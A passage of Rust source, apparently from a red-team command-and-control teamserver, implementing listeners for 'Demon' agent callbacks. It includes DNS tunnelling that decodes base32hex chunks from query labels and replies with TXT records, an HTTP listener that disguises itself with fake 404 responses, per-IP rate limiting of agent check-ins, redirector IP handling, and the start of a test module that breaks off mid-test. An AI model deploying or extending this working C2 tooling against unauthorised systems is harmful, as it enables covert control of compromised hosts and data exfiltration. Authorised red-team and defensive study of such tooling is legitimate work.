    let id = u16::from_be_bytes([buf[0], buf[1]]);
    let flags = u16::from_be_bytes([buf[2], buf[3]]);
    if flags & DNS_FLAG_QR != 0 {
        return None;
    }
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);

    if qdcount != 1 {
        return None;
    }

    let mut pos = DNS_HEADER_LEN;
    let qname_start = pos;
    let mut labels = Vec::new();

    loop {
        if pos >= buf.len() {
            return None;
        }
        let len = usize::from(buf[pos]);
        if len == 0 {
            pos += 1;
            break;
        }
        // Reject DNS pointer compression in queries (not expected in client queries)
        if len & 0xC0 != 0 {
            return None;
        }
        pos += 1;
        if pos + len > buf.len() {
            return None;
        }
        let label = std::str::from_utf8(&buf[pos..pos + len]).ok()?.to_ascii_lowercase();
        labels.push(label);
        pos += len;
    }

    if pos + 4 > buf.len() {
        return None;
    }
    let qtype = u16::from_be_bytes([buf[pos], buf[pos + 1]]);
    let qname_raw = buf[qname_start..pos].to_vec();

    Some(ParsedDnsQuery { id, qname_raw, labels, qtype })
}

/// Parse DNS labels into a [`DnsC2Query`] if they match the expected C2 format.
///
/// Expected formats (labels listed from leftmost to rightmost, domain stripped):
/// * Upload:   `["<b32>", "<seq>-<total>-<aid>", "up"]`
/// * Download: `["<seq>-<aid>",                  "dn"]`
fn parse_dns_c2_query(labels: &[String], domain: &str) -> Option<DnsC2Query> {
    // Strip the domain suffix labels from the right
    let domain_labels: Vec<&str> = domain.split('.').collect();
    let domain_label_count = domain_labels.len();

    if labels.len() <= domain_label_count {
        return None;
    }

    // Verify domain suffix matches
    let suffix = &labels[labels.len() - domain_label_count..];
    if suffix.iter().zip(domain_labels.iter()).any(|(a, b)| a != b) {
        return None;
    }

    let c2_labels = &labels[..labels.len() - domain_label_count];

    match c2_labels {
        // Upload: [b32data, "seq-total-aid", "up"]
        [b32data, ctrl, up] if up == "up" => {
            let parts: Vec<&str> = ctrl.splitn(3, '-').collect();
            if parts.len() != 3 {
                return None;
            }
            let seq = u16::from_str_radix(parts[0], 16).ok()?;
            let total = u16::from_str_radix(parts[1], 16).ok()?;
            let agent_id = u32::from_str_radix(parts[2], 16).ok()?;
            let data = base32hex_decode(b32data)?;
            Some(DnsC2Query::Upload { agent_id, seq, total, data })
        }
        // Download: ["seq-aid", "dn"]
        [ctrl, dn] if dn == "dn" => {
            let parts: Vec<&str> = ctrl.splitn(2, '-').collect();
            if parts.len() != 2 {
                return None;
            }
            let seq = u16::from_str_radix(parts[0], 16).ok()?;
            let agent_id = u32::from_str_radix(parts[1], 16).ok()?;
            Some(DnsC2Query::Download { agent_id, seq })
        }
        _ => None,
    }
}

/// Encode `data` as uppercase base32hex (RFC 4648 §7) with no padding.
fn base32hex_encode(data: &[u8]) -> String {
    let mut result = String::with_capacity((data.len() * 8).div_ceil(5));
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for &byte in data {
        buf = (buf << 8) | u32::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            result.push(char::from(BASE32HEX_ALPHABET[((buf >> bits) & 0x1F) as usize]));
        }
    }

    if bits > 0 {
        result.push(char::from(BASE32HEX_ALPHABET[((buf << (5 - bits)) & 0x1F) as usize]));
    }

    result
}

/// Decode a base32hex string (case-insensitive, no padding) into bytes.
///
/// Returns `None` if any character is outside the base32hex alphabet.
fn base32hex_decode(s: &str) -> Option<Vec<u8>> {
    let mut result = Vec::with_capacity(s.len() * 5 / 8);
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;

    for ch in s.bytes() {
        let val = match ch {
            b'0'..=b'9' => u32::from(ch - b'0'),
            b'a'..=b'v' => u32::from(ch - b'a' + 10),
            b'A'..=b'V' => u32::from(ch - b'A' + 10),
            _ => return None,
        };
        buf = (buf << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
        }
    }

    Some(result)
}

/// Split a Demon response payload into base32hex-encoded chunks for DNS delivery.
fn chunk_response_to_b32hex(payload: &[u8]) -> Vec<String> {
    payload.chunks(DNS_RESPONSE_CHUNK_BYTES).map(base32hex_encode).collect()
}

/// Build a DNS TXT response for `query_id` carrying `txt_data`.
///
/// The question section is reconstructed from `qname_raw` (which already includes the
/// zero-label terminator), and a single answer TXT record is appended using a pointer
/// back to offset 12 (the start of the question QNAME).
fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], qtype: u16, txt_data: &[u8]) -> Vec<u8> {
    // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
    let txt_data = &txt_data[..txt_data.len().min(255)];
    // RDLENGTH = 1 (length byte) + txt_data.len()
    let rdlength = u16::try_from(1 + txt_data.len()).unwrap_or(u16::MAX);

    let mut response = Vec::with_capacity(
        DNS_HEADER_LEN + qname_raw.len() + 1 + 4 + 2 + 2 + 2 + 4 + 2 + 1 + txt_data.len(),
    );

    // Header (12 bytes)
    response.extend_from_slice(&query_id.to_be_bytes());
    let flags: u16 = DNS_FLAG_QR | DNS_FLAG_AA | DNS_RCODE_NOERROR;
    response.extend_from_slice(&flags.to_be_bytes());
    response.extend_from_slice(&1u16.to_be_bytes()); // qdcount = 1
    response.extend_from_slice(&1u16.to_be_bytes()); // ancount = 1
    response.extend_from_slice(&0u16.to_be_bytes()); // nscount = 0
    response.extend_from_slice(&0u16.to_be_bytes()); // arcount = 0

    // Question section: QNAME (includes zero-label terminator) + QTYPE + QCLASS
    // qname_raw includes the zero-label terminator as captured by parse_dns_query.
    response.extend_from_slice(qname_raw);
    response.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // QCLASS

    // Answer RR
    // NAME: pointer to offset 12 (start of QNAME in question), encoded as 0xC00C
    response.extend_from_slice(&[0xC0, 0x0C]);
    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // TYPE = TXT
    response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // CLASS = IN
    response.extend_from_slice(&0u32.to_be_bytes()); // TTL = 0 (no caching)
    response.extend_from_slice(&rdlength.to_be_bytes()); // RDLENGTH
    response.push(txt_data.len() as u8); // TXT string length byte
    response.extend_from_slice(txt_data); // TXT string data

    response
}

/// Build a DNS REFUSED response for `query_id`.
fn build_dns_refused_response(query_id: u16) -> Vec<u8> {
    let mut response = vec![0u8; DNS_HEADER_LEN];
    response[0] = (query_id >> 8) as u8;
    response[1] = query_id as u8;
    let flags: u16 = DNS_FLAG_QR | DNS_RCODE_REFUSED;
    response[2] = (flags >> 8) as u8;
    response[3] = flags as u8;
    response
}

#[allow(clippy::too_many_arguments)]
async fn spawn_dns_listener_runtime(
    config: &DnsListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
    max_download_bytes: u64,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    if dns_allowed_query_types(&config.record_types).is_none() {
        return Err(ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!(
                "unsupported DNS record type configuration: {}",
                config.record_types.join(",")
            ),
        });
    }

    let state = Arc::new(DnsListenerState::new(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        demon_init_rate_limiter,
        shutdown,
        max_download_bytes,
    ));
    let addr = format!("{}:{}", config.host_bind, config.port_bind);

    let socket =
        UdpSocket::bind(&addr).await.map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind DNS UDP socket {addr}: {error}"),
        })?;

    Ok(Box::pin(async move {
        let mut buf = vec![0u8; 4096];
        let mut cleanup_interval =
            tokio::time::interval(Duration::from_secs(DNS_UPLOAD_CLEANUP_INTERVAL_SECS));
        loop {
            tokio::select! {
                _ = cleanup_interval.tick() => {
                    state.cleanup_expired_uploads().await;
                }
                _ = state.shutdown.notified() => {
                    return Ok(());
                }
                recv = socket.recv_from(&mut buf) => {
                    let (len, peer) = match recv {
                        Ok(result) => result,
                        Err(error) => {
                            return Err(format!(
                                "dns listener `{}` recv error: {error}",
                                state.config.name
                            ));
                        }
                    };

                    let peer_ip = peer.ip();
                    let packet = &buf[..len];

                    // Process DNS packets on the receive loop to keep backpressure bounded by the
                    // socket buffer instead of creating an unbounded task queue under UDP flood.
                    if let Some(response) = state.handle_dns_packet(packet, peer_ip).await {
                        if let Err(error) = socket.send_to(&response, peer).await {
                            warn!(listener = %state.config.name, %error, "dns listener send error");
                        }
                    }
                }
            }
        }
    }))
}

// Production builds must keep the DNS runtime entrypoint available so manager start paths
// cannot silently drift back to a test-only implementation.
const _: () = {
    let _ = spawn_dns_listener_runtime;
};

async fn build_http_tls_config(
    config: &HttpListenerConfig,
) -> Result<RustlsConfig, ListenerManagerError> {
    let subject_alt_names = http_listener_subject_alt_names(config);
    let cert_config =
        config.cert.as_ref().map(|cert| red_cell_common::config::HttpListenerCertConfig {
            cert: cert.cert.clone(),
            key: cert.key.clone(),
        });
    let identity =
        resolve_tls_identity(&subject_alt_names, cert_config.as_ref(), TlsKeyAlgorithm::EcdsaP256)
            .map_err(|error| ListenerManagerError::StartFailed {
                name: config.name.clone(),
                message: format!("failed to resolve TLS identity: {error}"),
            })?;

    RustlsConfig::from_pem(identity.certificate_pem().to_vec(), identity.private_key_pem().to_vec())
        .await
        .map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to build rustls configuration: {error}"),
        })
}

fn http_listener_subject_alt_names(config: &HttpListenerConfig) -> Vec<String> {
    let mut names = Vec::new();

    for value in config
        .hosts
        .iter()
        .chain(std::iter::once(&config.host_bind))
        .chain(config.host_header.iter())
    {
        let trimmed = value.trim();
        if trimmed.is_empty() || names.iter().any(|entry| entry == trimmed) {
            continue;
        }

        names.push(trimmed.to_owned());
        if trimmed.parse::<IpAddr>().is_ok_and(|address| address.is_unspecified()) {
            if !names.iter().any(|entry| entry == "127.0.0.1") {
                names.push("127.0.0.1".to_owned());
            }
            if !names.iter().any(|entry| entry == "localhost") {
                names.push("localhost".to_owned());
            }
        }
    }

    if names.is_empty() {
        names.push("127.0.0.1".to_owned());
    }

    names
}

async fn http_listener_handler(
    State(state): State<Arc<HttpListenerState>>,
    ConnectInfo(peer): ConnectInfo<SocketAddr>,
    request: Request<Body>,
) -> Response {
    if !http_request_matches(&state, &request) {
        return state.fake_404_response();
    }

    let external_ip = extract_external_ip(
        state.config.behind_redirector,
        &state.trusted_proxy_peers,
        peer,
        &request,
    );
    let (_, body) = request.into_parts();
    let Ok(body) = to_bytes(body, MAX_AGENT_REQUEST_BODY_LEN).await else {
        return state.fake_404_response();
    };

    if !is_valid_demon_callback_request(&body) {
        return state.fake_404_response();
    }

    let Some(_callback_guard) = state.shutdown.try_track_callback() else {
        return state.fake_404_response();
    };

    if !allow_demon_init_for_ip(
        &state.config.name,
        &state.demon_init_rate_limiter,
        external_ip,
        body.as_ref(),
    )
    .await
    {
        return state.fake_404_response();
    }

    match process_demon_transport(
        &state.config.name,
        &state.registry,
        &state.database,
        &state.parser,
        &state.events,
        &state.dispatcher,
        &body,
        external_ip.to_string(),
    )
    .await
    {
        Ok(response) if response.http_disposition == DemonHttpDisposition::Fake404 => {
            state.fake_404_response()
        }
        Ok(response) if response.payload.is_empty() => state.callback_empty_response(),
        Ok(response) => state.callback_bytes_response(&response.payload),
        Err(error) => {
            warn!(listener = %state.config.name, %error, "failed to process demon callback");
            state.fake_404_response()
        }
    }
}

fn http_request_matches(state: &HttpListenerState, request: &Request<Body>) -> bool {
    request.method() == state.method
        && uri_matches(&state.config, request)
        && user_agent_matches(&state.config, request.headers())
        && headers_match(&state.required_headers, request.headers())
}

fn uri_matches(config: &HttpListenerConfig, request: &Request<Body>) -> bool {
    if config.uris.is_empty() || (config.uris.len() == 1 && config.uris[0].is_empty()) {
        return true;
    }

    let request_uri = request
        .uri()
        .path_and_query()
        .map_or_else(|| request.uri().path(), axum::http::uri::PathAndQuery::as_str);

    config.uris.iter().any(|uri| uri == request_uri)
}

fn user_agent_matches(config: &HttpListenerConfig, headers: &HeaderMap) -> bool {
    match config.user_agent.as_deref() {
        Some(expected) => {
            headers.get(axum::http::header::USER_AGENT).and_then(|value| value.to_str().ok())
                == Some(expected)
        }
        None => true,
    }
}

fn headers_match(expected_headers: &[ExpectedHeader], headers: &HeaderMap) -> bool {
    expected_headers.iter().all(|expected| {
        headers
            .get(&expected.name)
            .and_then(|value| value.to_str().ok())
            .is_some_and(|actual| actual.eq_ignore_ascii_case(&expected.expected_value))
    })
}

fn extract_external_ip(
    behind_redirector: bool,
    trusted_proxy_peers: &[TrustedProxyPeer],
    peer: SocketAddr,
    request: &Request<Body>,
) -> IpAddr {
    if behind_redirector && peer_is_trusted_proxy(peer.ip(), trusted_proxy_peers) {
        if let Some(ip) = request
            .headers()
            .get("x-forwarded-for")
            .and_then(|value| value.to_str().ok())
            .and_then(|value| forwarded_for_client_ip(value, trusted_proxy_peers))
        {
            return ip;
        }

        if let Some(ip) = request
            .headers()
            .get("x-real-ip")
            .and_then(|value| value.to_str().ok())
            .map(str::trim)
            .and_then(|value| value.parse::<IpAddr>().ok())
        {
            return ip;
        }
    }

    peer.ip()
}

fn forwarded_for_client_ip(
    value: &str,
    trusted_proxy_peers: &[TrustedProxyPeer],
) -> Option<IpAddr> {
    let hops = value
        .split(',')
        .map(str::trim)
        .map(|hop| (!hop.is_empty()).then_some(hop))
        .collect::<Option<Vec<_>>>()?;
    if hops.is_empty() {
        return None;
    }

    let hops =
        hops.into_iter().map(|hop| hop.parse::<IpAddr>().ok()).collect::<Option<Vec<_>>>()?;

    for hop in hops.into_iter().rev() {
        if peer_is_trusted_proxy(hop, trusted_proxy_peers) {
            continue;
        }
        return Some(hop);
    }

    None
}

fn parse_trusted_proxy_peer(
    value: &str,
    listener_name: &str,
) -> Result<TrustedProxyPeer, ListenerManagerError> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: value must not be empty"
            ),
        });
    }

    if let Ok(address) = trimmed.parse::<IpAddr>() {
        return Ok(TrustedProxyPeer::Address(address));
    }

    let Some((network, prefix_len)) = trimmed.split_once('/') else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` must be an IP address or CIDR"
            ),
        });
    };

    let network = network.parse::<IpAddr>().map_err(|_| ListenerManagerError::InvalidConfig {
        message: format!(
            "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` must be an IP address or CIDR"
        ),
    })?;
    let prefix_len =
        prefix_len.parse::<u8>().map_err(|_| ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` has an invalid prefix length"
            ),
        })?;
    let max_prefix_len = match network {
        IpAddr::V4(_) => 32,
        IpAddr::V6(_) => 128,
    };
    if prefix_len > max_prefix_len {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "invalid trusted proxy peer for listener `{listener_name}`: `{trimmed}` has an invalid prefix length"
            ),
        });
    }

    Ok(TrustedProxyPeer::Network(TrustedProxyNetwork { network, prefix_len }))
}

fn peer_is_trusted_proxy(peer_ip: IpAddr, trusted_proxy_peers: &[TrustedProxyPeer]) -> bool {
    trusted_proxy_peers.iter().any(|entry| match entry {
        TrustedProxyPeer::Address(address) => *address == peer_ip,
        TrustedProxyPeer::Network(network) => network.contains(peer_ip),
    })
}

impl TrustedProxyNetwork {
    fn contains(&self, ip: IpAddr) -> bool {
        match (self.network, ip) {
            (IpAddr::V4(network), IpAddr::V4(ip)) => {
                let mask = prefix_mask_u32(self.prefix_len);
                (u32::from(network) & mask) == (u32::from(ip) & mask)
            }
            (IpAddr::V6(network), IpAddr::V6(ip)) => {
                let mask = prefix_mask_u128(self.prefix_len);
                (u128::from(network) & mask) == (u128::from(ip) & mask)
            }
            _ => false,
        }
    }
}

fn prefix_mask_u32(prefix_len: u8) -> u32 {
    if prefix_len == 0 { 0 } else { u32::MAX << (32 - u32::from(prefix_len)) }
}

fn prefix_mask_u128(prefix_len: u8) -> u128 {
    if prefix_len == 0 { 0 } else { u128::MAX << (128 - u32::from(prefix_len)) }
}

fn is_valid_demon_callback_request(body: &[u8]) -> bool {
    if body.len() < MINIMUM_DEMON_CALLBACK_BYTES {
        return false;
    }

    if body[4..8] != DEMON_MAGIC_VALUE.to_be_bytes() {
        return false;
    }

    DemonHeader::from_bytes(body).is_ok()
}

fn parse_method(config: &HttpListenerConfig) -> Result<Method, ListenerManagerError> {
    config.method.as_deref().unwrap_or(DEFAULT_HTTP_METHOD).parse::<Method>().map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!("invalid HTTP method for listener `{}`: {error}", config.name),
        }
    })
}

fn parse_expected_header(
    header: &str,
    listener_name: &str,
) -> Result<Option<ExpectedHeader>, ListenerManagerError> {
    let Some((name, value)) = split_header(header) else {
        return Err(ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header `{header}`"
            ),
        });
    };

    if HEADER_VALIDATION_IGNORES.iter().any(|ignored| name.eq_ignore_ascii_case(ignored)) {
        return Ok(None);
    }

    let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
        ListenerManagerError::InvalidConfig {
            message: format!(
                "listener `{listener_name}` has an invalid required header name `{name}`: {error}"
            ),
        }
    })?;

    Ok(Some(ExpectedHeader { name, expected_value: value.to_owned() }))
}

fn parse_response_headers(
    response: &HttpListenerResponseConfig,
    listener_name: &str,
) -> Result<Vec<(HeaderName, HeaderValue)>, ListenerManagerError> {
    response
        .headers
        .iter()
        .map(|header| {
            let Some((name, value)) = split_header(header) else {
                return Err(ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header `{header}`"
                    ),
                });
            };

            let name = HeaderName::from_bytes(name.as_bytes()).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header name `{name}`: {error}"
                    ),
                }
            })?;
            let value = HeaderValue::from_str(value).map_err(|error| {
                ListenerManagerError::InvalidConfig {
                    message: format!(
                        "listener `{listener_name}` has an invalid response header value for `{name}`: {error}"
                    ),
                }
            })?;

            Ok((name, value))
        })
        .collect()
}

fn split_header(header: &str) -> Option<(&str, &str)> {
    let (name, value) = header.split_once(':')?;
    let name = name.trim();
    let value = value.trim();

    if name.is_empty() {
        return None;
    }

    Some((name, value))
}

fn build_response(
    status: StatusCode,
    body: &[u8],
    headers: &[(HeaderName, HeaderValue)],
) -> Response {
    let mut response = Response::new(axum::body::Body::from(body.to_vec()));
    *response.status_mut() = status;

    let response_headers = response.headers_mut();
    for (name, value) in headers {
        response_headers.insert(name.clone(), value.clone());
    }

    response
}

fn set_default_header(headers: &mut HeaderMap, name: &'static str, value: &'static str) {
    let header_name = HeaderName::from_static(name);
    if !headers.contains_key(&header_name) {
        headers.insert(header_name, HeaderValue::from_static(value));
    }
}

fn required_field<'a>(
    field: &'static str,
    value: Option<&'a str>,
) -> Result<&'a str, ListenerManagerError> {
    value.map(str::trim).filter(|value| !value.is_empty()).ok_or_else(|| {
        ListenerManagerError::InvalidConfig { message: format!("{field} is required") }
    })
}

fn required_extra_string(
    info: &ListenerInfo,
    field: &'static str,
) -> Result<String, ListenerManagerError> {
    match info.extra.get(field).and_then(serde_json::Value::as_str).map(str::trim) {
        Some(value) if !value.is_empty() => Ok(value.to_owned()),
        _ => Err(ListenerManagerError::InvalidConfig { message: format!("{field} is required") }),
    }
}

fn optional_extra_string(info: &ListenerInfo, field: &'static str) -> Option<String> {
    extra_value_as_str(info, field).and_then(|value| optional_trimmed(Some(value)))
}

fn extra_value_as_str<'a>(info: &'a ListenerInfo, field: &'static str) -> Option<&'a str> {
    info.extra.get(field).and_then(serde_json::Value::as_str)
}

fn parse_extra_bool(
    info: &ListenerInfo,
    field: &'static str,
) -> Result<bool, ListenerManagerError> {
    parse_bool(field, extra_value_as_str(info, field))
}

fn insert_optional_extra_string(
    extra: &mut BTreeMap<String, serde_json::Value>,
    field: &'static str,
    value: Option<&str>,
) {
    if let Some(value) = optional_trimmed(value) {
        extra.insert(field.to_owned(), serde_json::Value::String(value));
    }
}

fn parse_u16(field: &'static str, value: Option<&str>) -> Result<u16, ListenerManagerError> {
    let value = required_field(field, value)?;
    value.parse::<u16>().map_err(|error| ListenerManagerError::InvalidConfig {
        message: format!("{field} must be a valid port: {error}"),
    })
}

fn parse_optional_u16(
    field: &'static str,
    value: Option<&str>,
) -> Result<Option<u16>, ListenerManagerError> {
    match optional_trimmed(value) {
        Some(value) => {
            value.parse::<u16>().map(Some).map_err(|error| ListenerManagerError::InvalidConfig {
                message: format!("{field} must be a valid port: {error}"),
            })
        }
        None => Ok(None),
    }
}

fn parse_bool(field: &'static str, value: Option<&str>) -> Result<bool, ListenerManagerError> {
    match optional_trimmed(value) {
        Some(value) if value.eq_ignore_ascii_case("true") => Ok(true),
        Some(value) if value.eq_ignore_ascii_case("false") => Ok(false),
        Some(value) => Err(ListenerManagerError::InvalidConfig {
            message: format!("{field} must be `true` or `false`, got `{value}`"),
        }),
        None => Ok(false),
    }
}

fn optional_trimmed(value: Option<&str>) -> Option<String> {
    value.map(str::trim).filter(|value| !value.is_empty()).map(ToOwned::to_owned)
}

fn split_csv(value: Option<&str>) -> Vec<String> {
    value
        .map(|value| {
            value
                .split(',')
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .map(ToOwned::to_owned)
                .collect()
        })
        .unwrap_or_default()
}

fn proxy_from_operator(
    info: &ListenerInfo,
) -> Result<Option<HttpListenerProxyConfig>, ListenerManagerError> {
    if !parse_bool("Proxy Enabled", info.proxy_enabled.as_deref())? {
        return Ok(None);
    }

    Ok(Some(HttpListenerProxyConfig {
        enabled: true,
        proxy_type: optional_trimmed(info.proxy_type.as_deref()),
        host: required_field("Proxy Host", info.proxy_host.as_deref())?.to_owned(),
        port: parse_u16("Proxy Port", info.proxy_port.as_deref())?,
        username: optional_trimmed(info.proxy_username.as_deref()),
        password: optional_trimmed(info.proxy_password.as_deref()),
    }))
}

fn tls_config_from_operator(info: &ListenerInfo) -> Option<red_cell_common::ListenerTlsConfig> {
    match (
        optional_extra_string(info, EXTRA_CERT_PATH),
        optional_extra_string(info, EXTRA_KEY_PATH),
    ) {
        (Some(cert), Some(key)) => Some(red_cell_common::ListenerTlsConfig { cert, key }),
        _ => None,
    }
}

fn http_response_from_operator(info: &ListenerInfo) -> Option<HttpListenerResponseConfig> {
    let headers = split_csv(info.response_headers.as_deref());
    let body = optional_extra_string(info, EXTRA_RESPONSE_BODY);
    (!headers.is_empty() || body.is_some()).then_some(HttpListenerResponseConfig { headers, body })
}

#[cfg(test)]
mod tests {
    use std::collections::{HashMap, HashSet};
    use std::io;
    use std::net::TcpListener as StdTcpListener;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use std::time::Duration;
    use std::time::{Instant, SystemTime, UNIX_EPOCH};

    use super::{
        DEMON_INIT_WINDOW_DURATION, DNS_HEADER_LEN, DNS_MAX_PENDING_UPLOADS, DNS_MAX_UPLOAD_CHUNKS,
        DNS_TYPE_A, DNS_TYPE_CNAME, DNS_TYPE_TXT, DNS_UPLOAD_TIMEOUT_SECS, DemonInitRateLimiter,
        DnsListenerState, DnsPendingResponse, DnsPendingUpload, DnsUploadAssembly,
        ListenerEventAction, ListenerManager, ListenerManagerError, ListenerStatus,
        ListenerSummary, MAX_AGENT_REQUEST_BODY_LEN, MAX_DEMON_INIT_ATTEMPTS_PER_IP,
        MAX_SMB_FRAME_PAYLOAD_LEN, TrustedProxyPeer, action_from_mark, base32hex_decode,
        base32hex_encode, build_dns_txt_response, chunk_response_to_b32hex,
        dns_allowed_query_types, extract_external_ip, listener_config_from_operator,
        operator_requests_start, parse_dns_c2_query, parse_dns_query, parse_trusted_proxy_peer,
        profile_listener_configs, read_smb_frame, smb_local_socket_name,
        spawn_dns_listener_runtime, spawn_managed_listener_task,
    };
    use crate::{
        AgentRegistry, AuditQuery, AuditResultStatus, Database, EventBus, Job,
        PersistedListenerState, ShutdownController, SocketRelayManager, query_audit_log,
    };
    use axum::body::Body;
    use axum::http::Request;
    use axum::http::StatusCode;
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use interprocess::local_socket::ListenerOptions;
    use interprocess::local_socket::tokio::Stream as LocalSocketStream;
    use interprocess::local_socket::traits::tokio::Listener as _;
    use interprocess::local_socket::traits::tokio::Stream as _;
    use red_cell_common::AgentEncryptionInfo;
    use red_cell_common::config::Profile;
    use red_cell_common::crypto::{
        AGENT_IV_LENGTH, AGENT_KEY_LENGTH, ctr_blocks_for_len, decrypt_agent_data,
        decrypt_agent_data_at_offset, encrypt_agent_data,
    };
    use red_cell_common::demon::{DemonCommand, DemonEnvelope, DemonMessage};
    use red_cell_common::operator::{ListenerInfo, OperatorMessage};
    use red_cell_common::{
        DnsListenerConfig, ExternalListenerConfig, HttpListenerConfig, HttpListenerProxyConfig,
        HttpListenerResponseConfig, ListenerConfig, ListenerProtocol, ListenerTlsConfig,
        SmbListenerConfig,
    };
    use reqwest::Client;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::task::JoinHandle;
    use tokio::time::sleep;

    fn http_listener(name: &str, port: u16) -> ListenerConfig {
        ListenerConfig::from(HttpListenerConfig {
            name: name.to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        })
    }

    fn http_listener_with_redirector(
        name: &str,
        port: u16,
        trusted_proxy_peers: Vec<String>,
    ) -> ListenerConfig {
        ListenerConfig::from(HttpListenerConfig {
            name: name.to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: true,
            trusted_proxy_peers,
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
        })
    }

    fn smb_listener(name: &str, pipe_name: &str) -> ListenerConfig {
        ListenerConfig::from(SmbListenerConfig {
            name: name.to_owned(),
            pipe_name: pipe_name.to_owned(),
            kill_date: None,
            working_hours: None,
        })
    }

    fn external_listener(name: &str, endpoint: &str) -> ListenerConfig {
        ListenerConfig::from(ExternalListenerConfig {
            name: name.to_owned(),
            endpoint: endpoint.to_owned(),
        })
    }

    async fn manager() -> Result<ListenerManager, ListenerManagerError> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        Ok(ListenerManager::new(database, registry, events, sockets, None))
    }

    #[tokio::test]
    async fn demon_init_rate_limiter_blocks_after_threshold() {
        let limiter = DemonInitRateLimiter::new();
        let ip = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 10));

        for _ in 0..MAX_DEMON_INIT_ATTEMPTS_PER_IP {
            assert!(limiter.allow(ip).await);
        }

        assert!(!limiter.allow(ip).await);
    }

    #[tokio::test]
    async fn demon_init_rate_limiter_prunes_expired_windows() {
        let limiter = DemonInitRateLimiter::new();
        let stale_ip = IpAddr::V4(Ipv4Addr::new(198, 51, 100, 20));
        let fresh_ip = IpAddr::V4(Ipv4Addr::new(198, 51, 100, 21));

        {
            let mut windows = limiter.windows.lock().await;
            windows.insert(
                stale_ip,
                super::DemonInitAttemptWindow {
                    accepted_attempts: 1,
                    window_start: Instant::now()
                        - DEMON_INIT_WINDOW_DURATION
                        - Duration::from_secs(1),
                },
            );
        }

        assert!(limiter.allow(fresh_ip).await);
        let windows = limiter.windows.lock().await;
        assert!(!windows.contains_key(&stale_ip));
        assert!(windows.contains_key(&fresh_ip));
        drop(windows);
        assert_eq!(limiter.tracked_ip_count().await, 1);
    }

    #[test]
    fn extract_external_ip_ignores_forwarded_headers_from_untrusted_peers() {
        let peer = SocketAddr::from(([198, 51, 100, 25], 443));
        let trusted_proxy_peers =
            vec![TrustedProxyPeer::Address(IpAddr::V4(Ipv4Addr::new(203, 0, 113, 10)))];
        let request = Request::builder()
            .header("X-Forwarded-For", "10.0.0.77")
            .header("X-Real-IP", "10.0.0.88")
            .body(Body::empty())
            .expect("request should build");

        let external_ip = extract_external_ip(true, &trusted_proxy_peers, peer, &request);
        assert_eq!(external_ip, peer.ip());
    }

    #[test]
    fn extract_external_ip_uses_rightmost_untrusted_forwarded_hop() {
        let peer = SocketAddr::from(([203, 0, 113, 10], 443));
        let trusted_proxy_peers = vec![TrustedProxyPeer::Address(peer.ip())];
        let request = Request::builder()
            .header("X-Forwarded-For", "10.0.0.66, 10.0.0.77")
            .body(Body::empty())
            .expect("request should build");

        let external_ip = extract_external_ip(true, &trusted_proxy_peers, peer, &request);
        assert_eq!(external_ip, IpAddr::V4(Ipv4Addr::new(10, 0, 0, 77)));
    }

    #[test]
    fn extract_external_ip_skips_trusted_proxy_chain_when_parsing_forwarded_hops() {
        let peer = SocketAddr::from(([203, 0, 113, 10], 443));
        let trusted_proxy_peers = vec![
            TrustedProxyPeer::Address(peer.ip()),
